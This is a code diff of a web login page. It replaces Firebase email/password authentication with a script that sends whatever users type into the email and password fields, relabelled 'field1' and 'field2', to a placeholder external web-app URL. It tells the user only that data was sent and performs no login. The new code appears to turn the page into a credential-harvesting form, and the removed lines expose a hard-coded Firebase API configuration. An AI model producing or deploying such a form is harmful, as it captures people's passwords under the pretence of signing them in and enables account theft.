@@ -143,65 +143,40 @@
   </div>
 
   <!-- Firebase Integration Script -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { 
-      getAuth, 
-      signInWithEmailAndPassword, 
-      createUserWithEmailAndPassword 
-    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+  <script>
+    const scriptURL = 'YOUR_WEB_APP_URL';
+    const form = document.getElementById('sheetForm');
+    const statusText = document.getElementById('status');
 
-    // Replace with your actual Firebase Web App credentials
-    const firebaseConfig = {
-        apiKey: "AIzaSyBVKD-ta5RtvNQMX1k1KMaklAZuBf4T-uA",
-        authDomain: "thredz-1901b.firebaseapp.com",
-        projectId: "thredz-1901b",
-        storageBucket: "thredz-1901b.firebasestorage.app",
-        messagingSenderId: "754707217410",
-        appId: "1:754707217410:web:247c2e36a86f83aa00fb1b"
-    };
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      statusText.textContent = "Sending...";
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
+      // 1. Grab both field values
+      const val1 = document.getElementById('email').value;
+      const val2 = document.getElementById('password').value;
 
-    const loginForm = document.getElementById('loginForm');
-    const createAccountBtn = document.getElementById('createAccountBtn');
-
-    // Handle User Login
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault(); // Stop form from re-loading the page
-
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      try {
-        const userCredential = await signInWithEmailAndPassword(auth, email, password);
-        alert(`Login Successful! Welcome: ${userCredential.user.email}`);
-        // Redirect logic here: window.location.href = '/dashboard.html';
-      } catch (error) {
-        alert(`Login Error: ${error.message}`);
-      }
-    });
-
-    // Handle User Registration (Create New Account)
-    createAccountBtn.addEventListener('click', async () => {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      if (!email || !password) {
-        alert("Please enter an email and password first.");
-        return;
-      }
-
-      try {
-        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-        alert(`Account created successfully for ${userCredential.user.email}`);
-      } catch (error) {
-        alert(`Registration Error: ${error.message}`);
-      }
+      // 2. Send both values in the request body
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ 
+          field1: val1, 
+          field2: val2 
+        })
+      })
+      .then(() => {
+        statusText.textContent = "Data sent successfully!";
+        form.reset();
+      })
+      .catch(error => {
+        statusText.textContent = "Error sending data.";
+        console.error('Error!', error.message);
+      });
     });
   </script>
-
 </body>
 </html>
